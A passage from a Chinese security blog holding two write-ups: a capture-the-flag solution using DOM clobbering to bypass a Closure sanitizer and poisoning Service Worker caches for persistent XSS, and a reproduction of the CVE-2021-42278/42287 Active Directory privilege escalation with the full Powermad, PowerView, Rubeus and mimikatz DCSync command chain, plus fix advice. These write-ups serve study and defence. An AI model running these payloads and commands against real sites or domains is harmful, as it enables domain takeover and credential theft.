<p>​    通过调试代码分析，最终会调用到<code>(new goog.html.sanitizer.HtmlSanitizer).sanitize(a);</code>，而<code>a</code>变量就是受控的<code>html</code>变量。继续跟进<code>sanitize(a)</code>代码，会经过如下函数处理：<code>this.processToString(a)</code>–&gt;<code>this.processToTree(a)</code>–&gt;<code>goog.dom.removeChildren(d)</code>。</p>
<p>​    变量<code>a</code>在<code>processToTree</code>这个函数中进行了一些处理，也就是将字符串转换成了<code>html</code>标签。然后获取了整个标签的父标签，也就是最外层的标签对象，并将其赋值给了<code>d</code>变量。</p>
<p>​    然后将<code>d</code>变量传送给了<code>goog.dom.removeChildren</code>函数处理，我们看看该函数的具体实现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">goog.dom.removeChildren = function(a) &#123;</span><br><span class="line">    for (var b; b = a.firstChild; ) &#123;</span><br><span class="line">        a.removeChild(b)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    由于这里传入的变量是一个标签对象，了解<code>DOM Clobbering</code>的话就很容易看出来这里存在漏洞。例如传入的数据是<code>&lt;form&gt;</code>标签，其子标签元素<code>input</code>的<code>name</code>值为<code>removeChild</code>，那么上面的<code>a.removeChild</code>表示的就是<code>&lt;input&gt;</code>这个标签对象，而不再是函数，因此，这里最终会报错。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221171935020.png" alt="image-20211221171935020"></p>
<p>​    我在这里加了一个<code>console.log</code>输出变量，最终控制台输出<code>&lt;input&gt;</code>标签对象：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221172024957.png" alt="image-20211221172024957"></p>
<p>​    因此，我们最终构造<code>payload</code>的时候，只需要在前面加上<code>&lt;form&gt;&lt;input name=removeChild&gt;&lt;/form&gt;</code>即可逃过校验函数的检测，后面就可以构造<code>xss</code>利用代码。</p>
<h3 id="2、修改Service-Worker缓存"><a href="#2、修改Service-Worker缓存" class="headerlink" title="2、修改Service Worker缓存"></a>2、修改<code>Service Worker</code>缓存</h3><p>​    该题的第二个考点就是污染<code>Service Worker</code>来持久化<code>XSS</code>。先不谈为什么这里需要持久化，我们先单纯地学习一下这个知识点。出题师傅给了一篇论文，<code>https://swcacheattack.secpriv.wien/</code>，我们先对论文里面的内容做一个了解与分析。</p>
<p>​    文章给出的攻击思路，大概就是利用<code>xss</code>漏洞去污染<code>Service Worker</code>缓存，然后将缓存中的一些静态数据修改掉，当用户再次访问页面的时候，由于<code>Service Worker</code>缓存的存在，会直接将缓存的数据返回给用户。而这些缓存的数据，由于被修改了，这样也就达到了攻击用户的目的。</p>
<p>​    我们对文中给出的<code>payload</code>做一个简单的分析：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">(async () =&gt; &#123;</span><br><span class="line">    let p = `&lt;script&gt;document.querySelector(&#x27;#col-add button&#x27;).addEventListener(&#x27;click&#x27;, (event) =&gt; &#123;alert(&#x27;Password stolen: &#x27; + document.querySelector(&#x27;#col-add input[type=&quot;password&quot;]&#x27;).value);&#125;);&lt;/script&gt;`;</span><br><span class="line">    let t = &#x27;/safenotes/&#x27;;</span><br><span class="line">    let c = await caches.open(&#x27;static&#x27;);</span><br><span class="line">    let r = await c.match(t);</span><br><span class="line">    let rt = await r.text();</span><br><span class="line">    await c.put(t, </span><br><span class="line">      new Response(rt.replace(&#x27;&lt;/body&gt;&#x27;, p + &#x27;&lt;/body&gt;&#x27;), &#123;</span><br><span class="line">        status: 200,</span><br><span class="line">        statusText: &#x27;OK&#x27;,</span><br><span class="line">        headers: r.headers</span><br><span class="line">      &#125;)</span><br><span class="line">    );</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>​    这里的<code>caches.open</code>用来打开<code>static</code>缓存空间，然后通过<code>match</code>来寻找缓存文件，这里找到的文件如图所示：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211221180339796.png" alt="image-20211221180339796"></p>
<p>​    接下来，它将文件的内容读取出来，然后将构造的<code>payload</code>代码插入到文件内容中，并将更新的文件内容再次写入缓存空间。我们简单分析一下该攻击手法，攻击前提是存在一个<code>XSS</code>漏洞点，然后网站原本开启了<code>Service Worker</code>缓存。利用<code>XSS</code>漏洞，将缓存文件内容替换，从而达到攻击的目的。</p>
<p>​    我们回到这个题目，可以通过查看缓存空间，来获知哪些文件进行了缓存：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223095823428.png" alt="image-20211223095823428"></p>
<p>​    接下来的利用方式就是结合上面的思路，我们修改缓存文件，例如<code>jquery.min.js</code>，当有一个地方引入这个文件的时候，就会触发我们修改添加进去的<code>xss</code>恶意代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    let e = &quot;/jquery.min.js&quot;, </span><br><span class="line">        t = await caches.open(&quot;static-resources&quot;), </span><br><span class="line">        a = await t.match(e), </span><br><span class="line">        s = await a.text();</span><br><span class="line">    await t.put(e, new Response(s.replace(&quot;jQuery=C.$=S),S&#125;);&quot;,</span><br><span class="line">        `jQuery=C.$=S),S&#125;);alert(&#x27;xss&#x27;);`),  </span><br><span class="line">        &#123;</span><br><span class="line">            status: 200,</span><br><span class="line">            statusText: &quot;OK&quot;,</span><br><span class="line">            headers: a.headers</span><br><span class="line">        &#125;))</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>​    在本地简单搭建了一个<code>demo</code>来对此攻击示例做一个测试。在存在<code>xss</code>漏洞点的地方，输入上述<code>payload</code>，结果会导致<code>Jquey</code>缓存文件内容发生了改变，当我们再次访问导入了<code>Jquery</code>的页面的时候，会弹出<code>xss</code>框。</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211223113329929.png" alt="image-20211223113329929"></p>
<p>​    该题接下来的利用就是分析<code>bot</code>程序的行为，然后修改<code>action</code>属性值，最终将<code>flag</code>数据外带从而拿到<code>flag</code>值。</p>
<p>参考文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/306014.html">https://www.freebuf.com/articles/web/306014.html</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/23/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8---%E6%B9%96%E6%B9%98%E6%9D%AF2021-Pastebin%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/" data-id="cl8h2gj950007fgdpajpy4qj7" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-CVE-2021-42278&amp;CVE-2021-42278漏洞复现与分析" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" class="article-date">
  <time datetime="2021-12-17T03:52:40.000Z" itemprop="datePublished">2021-12-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/">CVE-2021-42278&amp;CVE-2021-42278漏洞复现与分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2021-42278-amp-CVE-2021-42287漏洞复现与分析"><a href="#CVE-2021-42278-amp-CVE-2021-42287漏洞复现与分析" class="headerlink" title="CVE-2021-42278&amp;CVE-2021-42287漏洞复现与分析"></a>CVE-2021-42278&amp;CVE-2021-42287漏洞复现与分析</h1><p>​    最近域内出现的一个域服务器提权的漏洞，影响很大。而且提权手法相对比较简单，对比于<code>Netlogon</code>权限提升漏洞，这种方式更加普遍，只需要一个域内普通账号，就可以提权至域管。</p>
<h2 id="一、漏洞介绍"><a href="#一、漏洞介绍" class="headerlink" title="一、漏洞介绍"></a>一、漏洞介绍</h2><h3 id="1、CVE-2021-42278"><a href="#1、CVE-2021-42278" class="headerlink" title="1、CVE-2021-42278"></a>1、<code>CVE-2021-42278</code></h3><p>​    一般来说，机器账号的名字应该以<code>$</code>符号结尾的。例如<code>DC$</code>表示<code>DC</code>这台主机的账户名。但是微软只是进行了规定，并没有验证程序对用户创建的用户名进行验证，也就是说，创建<code>DC</code>用户名完全是可以的。（这里指的是机器账号的<code>sAMAccountName</code>属性）</p>
<h3 id="2、CVE-2021-42287"><a href="#2、CVE-2021-42287" class="headerlink" title="2、CVE-2021-42287"></a>2、<code>CVE-2021-42287</code></h3><p>​    结合上面那个漏洞，如果创建了一个用户名为<code>DC</code>的账户，此时使用这个账户去申请一张<code>TGT</code>票据，然后在申请<code>ST</code>之前，将这个账户名修改掉或者删除掉，那么在进行申请<code>ST</code>的时候，<code>KDC</code>在进行验证时就查不到这个账户，此时<code>KDC</code>就会去查找<code>DC$</code>这个账户，如果这个账户存在的话，最终返回的就是<code>DC$</code>这个账户申请的<code>ST</code>。也就相当于获取到了域控账户申请的高权限服务票据。</p>
<h2 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h2><h3 id="1、漏洞细节复现"><a href="#1、漏洞细节复现" class="headerlink" title="1、漏洞细节复现"></a>1、漏洞细节复现</h3><p>​    根据漏洞的描述，我们只需要一个域用户，然后就可以将其提权至域管，从而接管域控，整个漏洞的利用过程大概如下：</p>
<ol>
<li>创建一个机器账户</li>
<li>清除机器账户的<code>SPN</code></li>
<li>修改机器账户的<code>sAMAccountName</code>属性值</li>
<li>使用机器账户请求<code>TGT</code></li>
<li>再次修改机器账户的<code>sAMAccountName</code>属性值</li>
<li>获取高权限<code>ST</code>票据</li>
</ol>
<h4 id="（1）创建机器账户"><a href="#（1）创建机器账户" class="headerlink" title="（1）创建机器账户"></a>（1）创建机器账户</h4><p>​    一般域用户可以创建很多机器账户，这里使用<code>Powermad.ps1</code>来进行机器账号的创建：（创建一个名为<code>m1sn0w$</code>）的机器账号</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount m1sn0w -Domain god.org -DomainController owa.god.org -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217102443077.png" alt="image-20211217102443077"></p>
<h4 id="（2）清除该机器账号的SPN"><a href="#（2）清除该机器账号的SPN" class="headerlink" title="（2）清除该机器账号的SPN"></a>（2）清除该机器账号的<code>SPN</code></h4><p>​    <code>PowerView.ps1</code>是<code>PowerSploit</code>下的一个工具：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 导入</span><br><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line"></span><br><span class="line">Set-DomainObject &quot;CN=m1sn0w,CN=Computers,DC=god,DC=org&quot; -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217102629992.png" alt="image-20211217102629992"></p>
<h4 id="（3）修改机器账号的sAMAccountName属性值"><a href="#（3）修改机器账号的sAMAccountName属性值" class="headerlink" title="（3）修改机器账号的sAMAccountName属性值"></a>（3）修改机器账号的<code>sAMAccountName</code>属性值</h4><p>​    这里就需要利用到<code>CVE-2021-42278</code>漏洞，将<code>sAMAccountName</code>的值改为域控的机器账号名，我们可以通过<code>Nslookup</code>来进行查询：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type=SRV _ldap._tcp</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217102933168.png" alt="image-20211217102933168"></p>
<p>​    获取到域控的机器账号名之后，我们将自己创建的机器账号的<code>sAMAccountName</code>的值改为域控的机器账号名。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount m1sn0w -Value &quot;owa&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217103141242.png" alt="image-20211217103141242"></p>
<h4 id="（4）使用机器账户请求TGT"><a href="#（4）使用机器账户请求TGT" class="headerlink" title="（4）使用机器账户请求TGT"></a>（4）使用机器账户请求<code>TGT</code></h4><p>​    接下来使用刚刚创建生成的机器账号来申请一张<code>TGT</code>票据：（这里将运行结果保存在指定的文件中）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:owa /password:qwe123 /domain:god.org /dc:owa.god.org /nowrap /consoleoutfile:2.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217103423301.png" alt="image-20211217103423301"></p>
<h4 id="（5）再次修改机器账户的sAMAccountName属性值"><a href="#（5）再次修改机器账户的sAMAccountName属性值" class="headerlink" title="（5）再次修改机器账户的sAMAccountName属性值"></a>（5）再次修改机器账户的<code>sAMAccountName</code>属性值</h4><p>​    接下来开始利用<code>CVE-2021-42287</code>漏洞，我们首先将机器账号名改回去获取清除掉：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount m1sn0w -Value &quot;m1sn0w&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217104241491.png" alt="image-20211217104241491"></p>
<h4 id="（6）利用S4U2self获取ST票据"><a href="#（6）利用S4U2self获取ST票据" class="headerlink" title="（6）利用S4U2self获取ST票据"></a>（6）利用<code>S4U2self</code>获取<code>ST</code>票据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./Rubeus.exe s4u /self /impersonateuser:&quot;Administrator&quot; /altservice:&quot;ldap/owa.god.org&quot; /dc:&quot;owa.god.org&quot; /ptt /ticket:TGT值</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217104617192.png" alt="image-20211217104617192"></p>
<h4 id="（7）利用DCSync获取域控下所有用户hash"><a href="#（7）利用DCSync获取域控下所有用户hash" class="headerlink" title="（7）利用DCSync获取域控下所有用户hash"></a>（7）利用<code>DCSync</code>获取域控下所有用户<code>hash</code></h4><p>​    当完成上述所有操作之后，我们就获取到一个高权限的票证。利用此票证，我们通过<code>DCSync</code>获取域内所有用户的<code>Hash</code>值：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:god.org /kdc:owa.god.org /user:krbtgt&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211217105228789.png" alt="image-20211217105228789"></p>
<h3 id="2、利用sam-the-admin-py获取shell"><a href="#2、利用sam-the-admin-py获取shell" class="headerlink" title="2、利用sam_the_admin.py获取shell"></a>2、利用<code>sam_the_admin.py</code>获取<code>shell</code></h3><p>​    我们可以利用<code>sam_the_admin.py</code>脚本获取到<code>Shell</code>：</p>
<p><img src="https://gitee.com/m1sn0w/BlogImg/raw/master/img/image-20211216125208262.png" alt="image-20211216125208262"></p>
<p>​    从上面输出的信息来看，该工具也是按照上述步骤进行了操作。</p>
<h2 id="三、漏洞影响范围"><a href="#三、漏洞影响范围" class="headerlink" title="三、漏洞影响范围"></a>三、漏洞影响范围</h2><ul>
<li><p>Windows Server 2012 R2 (Server Core installation)</p>
</li>
<li><p>Windows Server 2012 R2</p>
</li>
<li><p>Windows Server 2012 (Server Core installation)</p>
</li>
<li><p>Windows Server 2012</p>
</li>
<li><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</p>
</li>
<li><p>Windows Server 2008 R2 for x64-based Systems Service Pack 1</p>
</li>
<li><p>Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)</p>
</li>
<li><p>Windows Server 2008 for x64-based Systems Service Pack 2</p>
</li>
<li><p>Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)</p>
</li>
<li><p>Windows Server 2008 for 32-bit Systems Service Pack 2</p>
</li>
<li><p>Windows Server 2016 (Server Core installation)</p>
</li>
<li><p>Windows Server 2016</p>
</li>
<li><p>Windows Server, version 20H2 (Server Core Installation)</p>
</li>
<li><p>Windows Server, version 2004 (Server Core installation)</p>
</li>
<li><p>Windows Server 2022 (Server Core installation)</p>
</li>
<li><p>Windows Server 2022</p>
</li>
<li><p>Windows Server 2019 (Server Core installation)</p>
</li>
<li><p>Windows Server 2019</p>
</li>
</ul>
<h2 id="四、修复建议"><a href="#四、修复建议" class="headerlink" title="四、修复建议"></a>四、修复建议</h2><p>1、更新至最新的安全版本</p>
<p>2、通过域控的 <code>ADSI</code> 编辑器⼯具将 <code>AD</code> 域的 <code>MAQ</code> 配置为 0。</p>
<h2 id="五、参考文章"><a href="#五、参考文章" class="headerlink" title="五、参考文章"></a>五、参考文章</h2><p>【sAMAccountName spoofing】<a target="_blank" rel="noopener" href="https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing">https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/12/17/CVE-2021-42278&CVE-2021-42278%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" data-id="cl8h2gj8v0000fgdp7j8pfi72" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" style="font-size: 10px;">域渗透</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">March 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">December 2021</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/09/25/%E5%9F%9F%E6%B8%97%E9%80%8F---%E9%BB%84%E9%87%91%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE%E4%BC%AA%E9%80%A0/">域渗透---黄金白银票据伪造</a>
          </li>
        
          <li>
            <a href="/2022/08/10/XXE%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">xxe外部实体注入漏洞</a>
          </li>
        
          <li>
            <a href="/2022/06/04/WordPress%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2022-21661%E5%88%86%E6%9E%90%E4%B8%8E%E5%A4%8D%E7%8E%B0%EF%BC%89/">WordPress SQL注入漏洞（CVE-2022-21661分析与复现）</a>
          </li>
        
          <li>
            <a href="/2022/03/31/Java%E5%AE%89%E5%85%A8---JNDI%E6%B3%A8%E5%85%A5%E8%A7%A3%E6%9E%90/">Java安全---JNDI注入解析</a>
          </li>
        
          <li>
            <a href="/2022/03/30/Java%20CC%E9%93%BE1-5%E5%88%86%E6%9E%90%E4%B8%8E%E6%80%BB%E7%BB%93/">Java CC链1-5分析与总结</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 John Doe<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>